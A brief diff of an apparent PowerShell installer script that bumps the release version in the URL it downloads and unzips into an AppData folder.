@@ -37,7 +37,7 @@ if($IsLinux)
 {
     $OS = "linux"
 }
-Invoke-WebRequest -Uri "https://github.com/doopyelephant/GoogleDocs/releases/download/v0.2.0-alpha/GoogleDocsInstaller-${OS}-${OSarch}.zip" -OutFile "$Release"
+Invoke-WebRequest -Uri "https://github.com/doopyelephant/GoogleDocs/releases/download/v0.4.0-alpha/GoogleDocsInstaller-${OS}-${OSarch}.zip" -OutFile "$Release"
 mkdir "$AppData\InstallerRelease"
 Expand-Archive -Path $Release -DestinationPath "$AppData\InstallerRelease"
 Remove-Item -Force $Release
